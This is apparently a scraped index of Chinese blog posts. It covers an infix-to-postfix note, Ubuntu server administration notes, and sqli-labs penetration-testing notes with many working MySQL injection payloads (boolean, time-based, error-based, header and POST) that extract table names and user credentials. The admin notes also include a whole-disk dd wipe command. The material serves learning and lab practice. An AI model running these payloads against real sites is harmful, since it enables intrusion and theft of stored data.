3、遇到操作数时，将其加入s2\n\n- 4、遇到运算符时，比较其与s1栈顶运算符的优先级\n\n  ```\n  - 4.1、如果s1为空，或栈顶运算符为左括号‘(’，则直接将此运算符入栈\n  - 4.2、否则，若优先级比栈顶运算符的高，也将运算符压入s1\n  - 4.3、否则，将s1栈顶的运算符弹出并加入到s2中，再次转到 流程4\n  ```\n\n  \n\n- 5、遇到括号时：\n\n  ```\n  - 5.1、如果是左括号‘(’，则直接压入s1\n  - 5.2、如果是右括号‘)’，则依次弹出s1栈顶的运算符，并且加入s2，直到遇到左括号为止，此时将这一对括号丢弃\n  ```\n\n  \n\n- 6、重复步骤 2-5，直到表达式的最右边\n\n- 7、将s1中剩余的运算符依次弹出并加入s2\n\n- 8、s2结果即为中缀表达式对应的后缀表达式\n\n  \n\n#### 3.2 实例\n\n以上面的转换为实例，比如输入 1 + ( ( 2 + 3 ) * 4 ) - 5，那么怎么转换成后缀表达式呢？\n\n| 扫描到的元素 | s2集合中元素 | s1(栈底->栈顶) | 说明                                 |\n| ------------ | ------------ | -------------- | ------------------------------------ |\n| 1            | 1            | 空             | 数字 直接加入到集合中                |\n| +            | 1            | +              | s1为空，直接入栈                     |\n| (            | 1            | +(             | 左括号 直接入栈                      |\n| (            | 1            | +( (           | 同上                                 |\n| 2            | 12           | +( (           | 数字                                 |\n| +            | 12           | +( (+          | s1栈顶是左括号，运算符直接入栈       |\n| 3            | 123          | +( (+          | 数字                                 |\n| )            | 123+         | +(             | 右括号，弹出运算符直至遇到左括号     |\n| *            | 123+         | +( *           | s1栈顶是左括号，运算符直接入栈       |\n| 4            | 123+4        | +( *           | 数字                                 |\n| )            | 123+4 *      | +              | 右括号，弹出运算符直至遇到左括号     |\n| -            | 123+4 *+     | -              | -与+优先级相同，因此弹出+号，在压入- |\n| 5            | 123+4 *+ 5   | -              | 数字                                 |\n| 到达最右端   | 123+4 *+ 5 - | 空             | s1中剩余的运算符                     |\n\n至此整个过程转换完毕\n\n即中缀表达式1 + ( ( 2 + 3 ) * 4 ) - 5 的后缀表达式为1 2 3 + 4 * + 5 -\n\n\n\n> 非原创原文链接：https://blog.csdn.net/qq_36144258/article/details/95075064","tags":["数据结构与算法"],"categories":["数据结构与算法"]},{"title":"ubuntu server-存储管理","url":"%2Fposts%2F3c80c560%2F","content":"\n\n\n\n\n> 基本篇\n\n# 存储\n>对磁盘的所有操作都要小心小心再小心  \n\n- 磁盘是计算机中最主要的存储设备\n- 传统磁盘分区与逻辑卷管理\n- 事前合理规划很重要\n- 对磁盘的所有操作都要小心小心再小心\n\n\n# 磁盘空间管理\n\n- `df `  查看硬盘总体使用情况\n```bash\n\ndf\n\n\"\"\"\n第一列： 文件系统\n第二列： 存储空间（多少数据块）\n第三列： 使用量\n第四列： 可用量\n第五列：使用率\n第六列：挂载点\n\"\"\"\n\ndf -h   # 人性化的方式\n\ndf -i    # 查看inodes使用量\n\n\n```\n\n- `du`   查看详细信息\n>是谁拿走了我的存储空间\n\n```bash\ndu   # 查看所有\n\ndu /   # 查看根目录/目录下的文件大小\n\n'''\n结合sudo权限\n'''\n\n'-h   # 人类易于阅读方式'\nsudo du  /  -h    \n\n'- s   # 汇总'\nsudo du  /*  -hs    # 显示汇总结果\n\n'-c   # 除了子文件和子目录之外，外加一个总和 '\nsudo du  /usr/*  -hsc\n\n```\n\n- 第三方工具 `ncdu`   （比较人性化的工具）\n```bash\n\napt install ncdu  # 安装\n\n\nncdu    # 使用（可以方向键和回车进入返回从 查看）\n按住't'  先显示目录，再显示文件\n按住'g'  显示百分比\n'q'退出\n\n```\n\n\n# 添加硬盘\n>扩容\n\n用vbox模拟添加硬盘：存储->SATA->添加硬盘\n\n\n\n###### 1.磁盘设备名称\n\n`dmsg`命令查看设备日志\n\n`/dev/`目录下面可以查看设备的名称\n\n`ls /dev/sd` \n\n###### 2.硬盘分区\n\n```bash\n## 1. fdisk\n-m  帮助菜单（查看参数）\n\n# 查看所有硬盘设备和分区情况\nsudo fdisk -l\n\n# 分区\nsudo fdisk /dev/sdb   # 进入向导\n# 先创建分区表\nO   # dos， MBR分区（基本分区） 传统分区格式，最大四个(主)分区，2T容量限制\ng   # GPT     未来标准，128个分区，无容量限制，推荐使用\n# 会生成一个16进制的guid\n\n# 再创建分区\nn\n输入数字编号（后门会递增）\n第一个扇区在哪个位置【让扇区决定磁盘大小】\n输入结束扇区（默认最后一个扇区）\n【也可以直接输入100M这种方式】\n\n# 再保存分区\nw\n# 查看分区结果\nsudo fdisk -l\n\n\n\n\n```\n\n###### 3.文件系统格式化\n`mkfs` 命令\n```bash\n\nsudo mkfs.ext4 /dev/sdb1\nsudo mkfs.xfs /dev/sdb2\n\n```\n**Linux上常用的格式：**\next4 （普通日常使用推荐）\nxfs （适用与超大空间比如100T, 多文件，数据库）\n\n###### 4. 挂载\n>绑定访问路径\n\n**一般两个挂载目录:**\n`/mnt/`  一般是硬盘等  （下面创建空的子目录再挂到子目录下）\n`/media/`   一般习惯使用挂： u盘等移动存储\n\n1.`mount`命令   (临时性的，重启之后失效)\n```bash\n# sdb代表那块硬盘， sdb1代表那个分区\nsudo mount /dev/sdb1 /mnt/storge/\n\n# -t 声明格式\nsudo mount /dev/sdb1 -t ext4 /mnt/storge/\n\n# 卸载目录下面的设备（如果busy就先退出这个目录先不要使用）\nsudo umount /storage\n\n```\n\n2. 自动挂载 `/etc/fstab`\n```bash\n\n'''\n第一列：设备ID         UUID， 唯一的标号/ 设备名也可以，推荐id\n第二列：挂载点         swap无需挂载(none)\n第三列：文件系统      ext4, swap...\n第四列：options     （ 参数， error=remount-ro的意思是发生错误只读形式挂） 一般填写默认就行 defaults:rw,exec,auto,nouser.asynchronous（异步存储）           nouser表示当前用户才可以\n第五列：dump        （基本没用，写0不备份就行，   备份的时候才设置1）     一般写 0\n第六列：pass            (FS错误时fsck是否检查错误，0不检查，1优先，2后查）  一般写 2\n\n'''\n实践：\n1.\nblkid  查看设备UUID\nlsblk -fP  查看设备id\n\n2.编辑文件\n\n3.\nreboot   \n或者\nmount -a   #将/etc/fstab的所有内容重新加载\n\n\n```\n\n-------------------------------------------------\n>高级篇\n\n# SWAP管理\n> 可能是你的救命稻草\n\n- 关于swap的争论\n    - 需要/不需要  （Raspberry Pi）\n    - 大小多少才合理（2-16G）\n    - Swap分区，swap文件\n- 理想状态下应该无事可做的swap\n    - 大量的swap空间使用意味着服务器已疲于奔命\n    - free -m      free -h     查看内存以及swap的\n- 某些云主机默认没有swap  \n\n\nubuntu中，是swap文件  \n\n###### Swap文件\n/swapfile\n\n\n#创建文件 制定大小，位置\n`sudo fallocate -l 8G  /swapfile`\n#查看文件\n`sudo xxd  /swapfile`\n#格式成swap文件  (记下 UUID)\n`sudo mkswap  /swapfile`\n#把权限调小\n`sudo chmod 0600  /swapfile`\n#修改挂载文件\nsudo vim /etv/fstab/\n        `/swapfile none swap sw 0 0`\n#关闭原来的swap\n`sudo swapoff -a`\n#开启\n`sudo swapon -a`\n\n\n\n###### Swap分区\n\n1.新增加一块硬盘\n（如果vox提示已经创建过了，打开目录，删除那个硬盘[不要误删主硬盘和快照]，和.pre文件； 编辑.vobx文件，把新增硬盘配置项删掉）  \n\n`ls /dev/sd*`\n\n2. 分区\n`fdisk /dev/sdb`\n\n3.新建主分区，`t`修改分区表类型为swap分区的格式 `82`，`w`保存退出  (L 列出所有支持的分区类型)\n可以看到：`/dev/sdb`已经分出了`/dev/sdb1`\n\n4. 格式化为swap\nsudo mkswap /dev/sdb1\n\n5修改挂载文件\nsudo vim /etv/fstab/\n        `UUID=xxxxxx none swap sw 0 0`\n        \n6.关闭原来的swap\n`sudo swapoff -a`\n\n#7.重新开启\n`sudo swapon -a`\n\n原有的swap就可以删除啦～～～\n\n\n\n# LVM管理\n>一项值得感谢的技术\n\n\n- 无须重启计算机灵活调整硬盘空间大小\n    - 硬盘分区太大浪费，太小无法满足业务发展需要\n    - 将传统的硬盘分区逻辑的组合为资源池，按需分配\n- 概念\n    - Volumn Groups  （卷组）（池化）： 把物理资源的变成逻辑的\n    - Physical Volumns (物理卷) \n    - Logical Volumnes （基本分区、RAID）： 可以存储数据的逻辑的概念，VG一部分资源的分割  \n- 安装包\n    - sudo apt install lvm2\n\n添加硬盘， 先创建PV, 再创建VG, 再创建LV\n\n**1.物理卷：**\n```bash\n# 创建物理卷\nsudo pvcreate /dev/sdb\n# 查看物理卷\nsudo pvdisplay\n# 查看简略的摘要信息\nsudo pvs\n\n\n```\n\n**2.卷组：**\n```bash\n\nsudo vgvreate vg01 /dev/sdb\n# 可以一次性指定多个pv\nsudo vgextend vg01 /dev/sdc /dev/sdd\n\n# 查看概要信息\nvgscan / vgs\n\nsudo vgs\n\n```\n**3.逻辑卷**\n```bash\n# 创建逻辑卷， -n 名称, -L 大小， 从哪个vg里面分割的\nsudo lvcreate -n lv-database -L 1G vg01\n    # 查看简要信息\n    sudo lvdisplay\n    sudo lvscan / lvs\n\n# 格式化，(fstab自动)挂载\nsudo mkfs.ext4 /dev/vg01/lv-database\n    sudo mount /dev/vg01/lv-database/  /mnt/lv-01\n    df -h\n\n# 灵活拓展的特性\nsudo lvextend /dev/vg01/lv-01 -l  256   # 增加完毕后大大小 256\nsudo lvextend /dev/vg01/lv-01 -l +256  # 带加号，又增加大小 256个块\n\nsudo lvextend /dev/vg01/lv-01 -L +2G    # 增加2G\n\n# VG FREE  谁的百分比\nsudo lvextend /dev/vg01/lv-01 -l 50%VG   # 拓展到vg的50%\nsudo lvextend /dev/vg01/lv-01 -l +50%VG   # 再拓展vg的50%\n\n# 逻辑卷扩充了\ndf -h  # 是文件系统的查看。 这之后还没有告诉文件系统\n# 把逻辑卷的扩充告诉文件系统，就可以用啦\nsudo resize2fs /dev/vg01/lv-01\n\n```\n\n**逻辑卷缩小**\n```bash\numount /dev/vg01/lv-01  # 必须下线\ne2fsck -f /dev/vg01/lv-01  # 检查文件系统\nresize2fs /dev/vg01/lv-01 1G # 缩小文件系统\nlvresize /dev/vg01/lv-01 -L 1G  # 缩小逻辑卷\n\n# 重新挂载查看\nsudo mount /dev/vg01/lv-01 /mnt/lv-01/\n```\n\n**快照**\n- 故障时可回退\n- **临时可回退机制，不可视为备份** (备份应该是异地备份)\n    - 本地保存，安全性无法保证\n- 系统根目录使用快照可以用于测试补丁更新\n    - 测试完成合并并删除快照\n- 创建快照等同创建一个新的LV（默认是空的）\n    - 初始不占空间，但文件发生修改时原块数据被拷贝\n    - 回退时将快照中原始数据覆盖当前快照已经被修改的\n\n```bash\n# 快照  -s 是快照lv，   -L大小\nsudo lvcreate -s -n s01 -L 2G vg01/lv-01\n# 快照LV可以被直接挂在，用于恢复单个文件\n\n# 恢复快照（恢复后快照被删除）  --mergr 哪个快照\nsudo lvconvet --merge vg01/s01\n\n# 直接是不能恢复的，我们查看一下\nsudo lvscan  # 让他不是active才行\n\nsudo umount /mnt/lv-01  # 退出当前目录，执行此命令卸载目录\nsudo lvchange -an vg01/lv-01  # -n 让他不active\nsudo lvchange -ay vg01/lv-01  # -y 让他active\nsudo mount dev/vg01/lv-01  /mnt/lv-01   # 重新挂载\n\n```\n**移动物理卷数据**\n当磁盘性能或老旧等因素需要更换硬盘，提前转移数据\n`# 后门是目标盘，前面 -n 是指定lv数据,   -i 数值，每隔几秒显示一下运行状态  `\n`sudo promove -n lv-01 /dev/sdb  /dev/sdc -i 1`\n`sudo pvdislpay`\n\n\n\n------\n\n> 从业务的角度来思考技术，不要做书呆子技术人员\n\n------\n# RAID 高级管理\n> 与LVM结合将达到完美\n\n\n**`软RAID`基于`mdadm`驱动实现**\n软RAID并不比硬RAID差\n```bash\nsudo apt install mdadm\nsudo mdadm -C -v /dev/md0 -l1 -n2 /dev/sdb /dev/sdc -z100M -x1 /dev/sdd\n-C    创建\n-v    详细信息\n-l    RAID类型（0，1，5，6，10）\n-n    RAID盘数量\n-z    从每个硬盘占用多少空间创建RAID\n-x    Spare盘（备用盘）数量+盘名\n\n# 约定俗成： 逻辑设备：以0结尾，物理设备以1结尾\n```\n\n**常用管理命令：**\n\n<img src=\"http://image.xpshuai.cn/20200207110021066_291689330.png\"> </img>\n\n查看raid盘的状况：    `cat /proc/mdstat` （开机之后临时生成的）\n-r 删除物理硬盘（如果正常状态下是提示busy的， 可以-f设置失效, --re-add重新加入磁盘阵列）\n-A 手动出发数据同步\n\n- 替换硬盘后安装Grub(系统启动盘)\n`sudo grub-install /dev/md0`\n\n- 格式化和加载\n`sudo mkfs.ext4 /dev/md0`\n\n------\n# 链接\n- 符号链接(软链接) 和 硬链接\n    ls -li （查看inode值）\n    inode: 存放文件元数据的数据对象，表现为一个数值编号\n\n\n- 创建`硬链接`（inode值是相同的， 给不同数据起了不同的名）\n    ln fileS fileD\n    ln log2013.log  ln2013\n\n    目录不能创建硬链接\n    不能移动硬链接到不同分区（inode改变）\n\n- 创建软`链接`\n    不共用inode\n    ln -s fileS fileD （可以跨设备，可以给目录... , 相对路径和绝对路径， 建议源文件是绝对路径，目标链接是相对路径）\n\n---\n\n# 数据加密/磁盘加密\n> 数据最值钱  \n\n**清除所有数据：**\n```bash\n# 把磁盘所有字节数据全覆盖为0\nsudo dd if=/dev/zero of=/dev/sdc\n```\n**磁盘加密：**\n```bash\n# 安装软件包\nsudo apt install cryptsetup             \n# 加密分区（需提前分区 fdisk）  （boot/引导分区是不能加密的）\nsudo cryptsetup luksFormat /dev/sdc1\n# 打开加密分区（随意命名）\nsudo cryptsetup luksOpen /dev/sdc1 srypt1\n# 格式化加密分区\nsudo mkfs.ext4 /dev/mapper/crypt1\n# 挂载在加密分区\nsudo mount  /dev/mapper/crypt1  /mnt/crypt1\n# 更改所有者\nsudo chown xps:xps /mnt/crypt1\n# 关闭加密分区(先umount)\nsudo umount /mnt/crypt1\nsudo cryptsetup:luksClose crypt1\n\n```\n\n> 不仅对硬盘有用， 也可以对U盘进行加密\n可以用cryptsetup对u盘加密，设置一个足够强度的密码， 也可以再格式化为ext4格式，让win用户不能直接打开\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"ubuntu server-进程管理&打包压缩","url":"%2Fposts%2Fa6154cbb%2F","content":"\n\n\n  \n#### 进程管理  \n######  ps  \n\n```bash\n信息：\nPID： 进程id\nTTY: 运行进程的终端设备\nSTAT： 进程状态(Sleep, Running)\nTIME： 该进程占用的cpu时间\nCOMMAND: 命令名称\n\n参数：\n-x： 当前用户启动的所有进程\n-ax： 所有用户启动的进程\n-u： 进程详细信息\n-aux:\n-w： 显示进程文件完整路径\n-auxw:\nps u PID    ($$: 当前shell的进程id)\n\nps -L pid号   # 查看当前进程下面的线程\n\nps fajx   # 查看进程树\n\npstree   # 更直观的进程树\n\n\n# 结束进程\nkill pid   # 默认Term\nkill -STOP pid   # 暂停进程  （杀病毒杀不掉的时候可以先stop）\nkill -CONT pid   # 回复已暂停的进程\nkill -KILL pid   # kill -9 pid\nkill -l  # 所有kill命令的信号 \n\n```\n\n\n\n\n\n\n\n#### 归档打包和压缩\n\n###### gzip  (GUN Zip)\n```bash\n\ngzip file1\n\ngunzip file1.gz\n\n# Gzip不支持多文件/目录的归档打包\n# 会干掉原始文件\n\n```\n\n\n###### tar打包归档 (Archive)\n\n\n```bash\ntar cvf file2.tar file1 file2 file3   # 并不进行压缩\ngzip file.tar                         # 可以打包之后再压缩\n\ngunzip   file.tar.gz   # 先解压\ntar xcvf file2.tar # 解包\n\n\n\n#  tar 结合gz\ntar zcvf file2.tar.gz file1 file2 file3   # 参数z 打包同事亚索\n\ntar -ztvf file.tar.gz    # -t 显示文件内容但是不解压\n\n\ntar jcvf c.tar.bz2 a b # bz2\n\n```\n\n\n\n###### bzip2\n速度可能慢一点，但是对文本文件压缩更小\n```bash\n\nbzip2 f   # 压缩\n\nnunzip f.bz2\n\n# tar 的 -j也可以\ntar jcvf c.tar.bz2 a b \n\n```\n\n#### sudoer\n`sudo`用户组   `cat /etc/group`中sudo组，才能加sudo运行命令\n- 处于安全的考虑 `sudo`  \n- visudo\n- 文件`/etc/sudoers`\n\n```shell\n\n组 所有主机=() 系统的哪些命令  \n%sudo All=(ALL:ALL) ALL\n\n\n# 指定配置\nuser_alias ADMINS = user1, user2  # 指定一些用户的别名\nADMINS ALL = (ALL)NOPASSWD:ALL    # 该别名的权限\n\nroot ALL=(ALL) ALL\n\n\n```\n\n\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"ubuntu server-帮助&输出与重定向","url":"%2Fposts%2Fdc8613b5%2F","content":"\n\n\n#### 获取帮助\n\n###### man\n\n```bash\nman cmd\n\nman -k keyword    #搜索关键词（不知道具体命令）\nman -k 'list directory contents'   # 多个关键字\n\n# 每个命令的 手册页 可以使用数字编号引用片段（section）\nman 5 passwd   #（ 按section查看）\n- 1：  用户命令\n- 2：  系统调用\n- 3：  高级Unix编程库文档（程序员常用）\n- 4：  设备借口和驱动信息（很少使用）\n- 5：  文件描述（系统配置文件）\n- 6：  Games\n- 7：  文件格式，惯例，编码(ASCII等)\n- 8：  系统命令和服务器\n```\n\n\n\n###### info\n\nGUN不太喜欢慢，因此开发了`info`\n有时候优于man，有时不是\n`info ls`\n\n`/usr/share/doc` # 部分软件包没有列入man或者info的文档\n\n###### cmd --help / -h\n\n绝大部分的不成文规定，并不都是，比如`ls -h`\n\n#### Shell输入与输出\n\n###### 输出重定向\n\n```shell\nls a/ > file   # 会覆盖\n\nls a >> file    # 追加\n\nhead /proc/cpuinfo \n\nhead  < /proc/cpuinfo    # 输入重定向\n\n\n#\n`set -C` 之后不得覆盖\n```\n\n###### 管道\n\n```bash\nhead /proc/cpuinfo | tar a-z A-Z\n\nifconfig | grep inet | awk'{print $2}' | awk -F. '{print $2}'   # -F 指定分隔符，这里以.分割\n```\n\n###### 标准错误 stderr(报错包含重要信息)\n\n```bash\n# 写脚本的时候有用，可以把错误信息报错到某个文件\nls /abc 2>e   # 2:标准错误      1:标准输出          0:标准输入\nls 0< a/\nls 1> file1\nls b 2> err1\n\n\nls a/ > f1 2>&1   # 标准输出、标准错误都输出到文件f1  （&1代表标准输出）\n```\n\n###### 常见报错信息\n\n<img src=\"http://image.xpshuai.cn//error.png\"></img>\n\n\n\n\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"07-mysql盲注","url":"%2Fposts%2F5241f069%2F","content":"\n\n\n# SQL测试-基于 布尔,延时 盲注\n\n>场景：无回显，并且没有报错和其他显示\n>能用布尔就不用延迟\n\n**几个相关函数：**\n`regexp`       regexp '^xiaodi[a-z]' 匹配xiaodi及xiaodi...等\n`if`       if(条件,5,0) 条件成立 返回5 反之 返回0\n`sleep`    sleep(5) SQL语句延时执行5秒\n`mid`    mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位\n`substr`   substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度\n`left`    left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位\n`length`    length(database())=8，判断数据库database()名的长度\n`ord`=`ascii`     ascii(x)=101，判断x的ascii码是否等于101，即email中的字母e\n`IFNULL()`  函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。\n`CAST()`和`CONVERT()`函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：`CAST(value as type);`        `CONVERT(value, type);`\n\n#### 基于布尔(逻辑)盲注\n\nLess-5\n用burp批量跑\n**0x01 获取`数据库`名操作Payload：**     left()\n获取数据库名长度值\n`?id=1' and length(database())=8 %23`\n\n获取数据库名第一位值\n`?id=1' and left(database(),1)='s' %23`     等于\n`?id=1' and left(database(),1)>'a' %23`     大于\n\n获取数据库名第二位值\n`?id=1' and left(database(),2) > 'sa' %23`\n`?id=1' and left(database(),2) = 'se' %23`\n\n\n\n**0x02 获取`表名`操作Payload：**     ascii(substr())\n获取表名第一个第一位的值（下面这个是获取表名中第一个表，的第二位的值）\n`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23`\n获取表名第一个第二位的值\n`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23`\n获取表名第二个第一位的值\n`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23`\n\n用burp批量跑(最后一种模式，设置两个变量  limit $0, 1), $1,1))=115)   \n\n\n\n**0x03 获取`列名`操作Payload：**    regxp\n获取列名regexp 查询users表第一个列名是否有us...列名\n`?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+`\n\n\n\n**0x04 获取`数据`操作Payload：**    ord(mid())\n获取数据 security.users表中username列名的第一个第一位\n`?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+`\n(获取username中的第一行的第一个字符的ascii，与68进行比较)\n\n\n\n\n#### 基于延时盲注\n\n**0x01 获取数据库名操作Payload：**     if(条件，成立返回值，不成立的返回值)\n获取数据库名第一个第一位\n`?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+`\n可以把sleep放外面：and sleep(if 'x'='yx, 5, 0)\n\n**0x02 获取表名操作Payload：**\n获取列名第一个第一位\n`?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(5),1)--+`\n\n>后续参考：https://www.cnblogs.com/xishaonian/p/6113965.html\n\n-----\n\n\n\n## SQL二次注入测试\n\n**案例测试**：\nless-24 及实际举例\n25-30关卡好多是二次注入\n\n> 自己练习\n\n**应用范围：**\n我们注册一个用户后，然后进入用户中心，对应的url地址： xxx.php?user=xiaodi\n如果把注册的用户名改为: `xx' union select 1,2,3 -- `  \n总之: 将注入语句让web写入到数据库中，web在调用数据库中数据查询时，就触发了...\n\n\n\n###### 原理\n\n<img src=\"http://image.xpshuai.cn/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.png\"></img>\n\n\n\n#### mybatis以及预编译如何防止SQL注入\n\n\n>参考：https://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"06-mysql类型报错注入","url":"%2Fposts%2F145e207%2F","content":"  \n\n# 1. SQL各种参数类型下的注入测试\n\n- 数字型-sqlilabs less2   `x.php?id=1`\n- 字符型-sqlilabs less1   `x.php?id=xiaodi`\n- 搜索型-自写测试           `x.php?q=1`      （select * from table where name like '%xi%'）\n\n**搞懂：**\n\n1. 搞清楚为何要区分上面的类型\n   数字的不带引号，字符型带符号，注意考虑干扰\n   搜索型：模糊搜索\n   计算机中搜索的通配符为`*`\n   数据库中搜索的通配符为`%`\n\n\n\n\n\n\n# 2. SQL各种报错方式下的注入测试\n\n>此类报错注入旨在解决无回显下的注入测试\n>注：MySQL 5.1.5版本后才包含`ExtractValue()`和`UpdateXML()`这2个函数\n\n**参考资料：**\nhttps://www.wandouip.com/t5i158282/\nhttp://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html\n\n\n###### `floor`报错\n\nsqlilabs less5\n\n>报错注入有长度限制，所以concat有时候不行， 需要limit 或者还需要sub\n>**payload:**\n\n```\n-- burp中注意空格问题（空格可以用+加号， 或者%20, 或者 /**/ 代替）\n?id=1'+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+\n?id=-1' and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + \n\n?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + \n\nhttp://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + \n\n-- 可以用burp批量跑 limit 0,1 的0这里。payload设置数字范围\n```\n\n###### `updatexml`报错\n\nsqlilabs less5\nupdatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数\n**payload:**\n\n```\n?id=1' and 1=(updatexml(1,concat(0x3a,(select version())),1))--+\n?id=1' and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+\n\nhttp://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + \n\nhttp://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + \n```\n\n###### `extractvalue`报错\n\nsqlilabs less5\nextractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数\n**payload:**\n\n```\nid=1' and extractvalue(1,concat(0x7e,user()))--+\n?id=1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+\n\n```\n\n\n\n\n\n# 3.SQL各种查询方式下的注入测试\n\n- select\n- insert（注册，用户添加，发布文章）   Less-18\n\n```\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n-- sql语句  ??? 对吗没验证，截图了\ninsert into users(username, passwd)  values('x' or updatexml(1,concat(0x3a,(  version() ),1)  or  '  ',  'psd');\n\n--payload\nUser-Agent: 中                    x' or updatexml(1,concat(0x7e,(version())),1) or ' \n\nUser-Agent: x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or ' \n\n自己练习增,删,改： updatexml和extra两个都实验\n```\n\n- delete（后台删除文章, 用户...）\n- update （改密码，数据同步）\n  通过以上查询方式与网站一个用的关系，可以由注入点产生的地方或者应用猜测到对方的SQL查询方式\n\n\n**环境搭建**\n\n> 自己搭建\n\n利用上述报错注入语句进行查询模式注入测试\n\n```\ncreate database newdb;\n\nuse newdb;\n\ncreate table users (\n    id int(3) not null auto_increment,\n    username varchar(20) not null,\n    passowrd varchar(20) not null,\n    primary key(id)\n);\n\ninsert into users values(1,'janes','Eyre');\n\n\n```\n\n> 注意使用场景，在什么情况下用到  \n\n\n**插件：**\n`mysql监控-Seay代码审计系统`        查看执行了哪些语句\n\n\n\n>报错注入有长度限制:32位, 如果长度超出会显示不全.\n>解决方案: substr((),1,1) 递进截取依次 (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1)\n\n\n\n###### 三种查询方式对应的报错注入测试\n\n**floor报错演示Payload**\n\n```sql\ninsert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x;\n) or '','Nervo');\n\nupdate users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2;\n\ndelete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a)\n\n```\n\n**updatexml报错演示Payload**\n\n```\ninsert into users(id,username,passowrd) values(2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or '','Nervo');\n\nupdate user set passowrd='Nicky' or  updatexml(1,concat(0x7e,(version())),0) or '' where id=2 and username='Nervo';\n\ndelete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or '';\n\n```\n\n**extractvalue报错演示Payload**\n\n```sql\ninsert into users(id,username,password) values(2,'Olivia' or extractvalue(1,concat(0x7e,database())) or '','Nervo');\n\nupdate users set passowrd='Nicky' or extractvalue(1,concat(0x7e,database())) or '';\n\ndelete from users where id=1 or extractvalue(1,concat(0x7e,database())) or '';\n\n```\n\n>参考：https://www.cnblogs.com/babers/articles/7252401.html\n\n**Notes:**\n\n>delete，insert，update语句存在sql注入，扫描工具常规扫描不能获取到（没有权限，前提要登录状态下/登录后按钮的点击事件工具里面不能自动点击）， 所以：**只能手工注入**\n\n**比如场景：**   注册/会员中心/删除文章/更新编辑文章       -->抓包：数据包地址+id参数 ： 手工测试","tags":["渗透测试"],"categories":["渗透测试"]},{"title":"05-mysql提交方式注入","url":"%2Fposts%2F462247e6%2F","content":"  \n# 常见提交方式下的注入漏洞\n\n>前言：WEB应用在数据传递接受中，针对SQL注入安全漏洞，由于数据大小，格式等原因，脚本在接受传递时会有多种传递方式，传递方式的不同将影响到安全测试的不同！本课将针对此类问题进行逐一讲解。\n\n\n  \n## 第一点：数据常见提交方式\n\n`https://www.cnblogs.com/weibanggang/p/9454581.html`\n\n\n\n\n\n  \n## 第二点：产生注入的接受方式\n\n例子：GET\nPOST：\nCOOKIE ：\nREQUEST ：     $_REQUEST()  何种方法都可以接参数\nSERVER： http头部注入。$_SERVER           https://www.cnblogs.com/jianmingyuan/p/5900064.html\n等\n\n\n\n\n\n## 第三点：实战测试案例-sqlilabs关卡\n\n#### post登陆框注入-sqlilabs less13\n\n涉及知识点:   万能密码\n\nLess-13 无回显\nLess-11 有回显\n\n```sql\n-- 一般是没有括号的，先手工，再工具试试有没有其他符号干扰\n-- 可以用hackbar等进行post参数注入\n\n-- 方法1\n')or 1=1 -- + \n-- 然后开始按照步骤开始利用 （盲猜  order by 3, 库名，表，列，数据）\nadmin') union select null,database()#\n-- 这里面没回显数据的 地方，想办法让他报错/工具跑\n-- sqlmap  post参数是  --data \"\"\n\n-- 下面的没成功， 可以再试试\nadmin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\\\n\n-- 报错注入\nadmin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#\n\n\n+加号类似空格  \n\n\n```\n\n#### http头部注入-sqlilabs 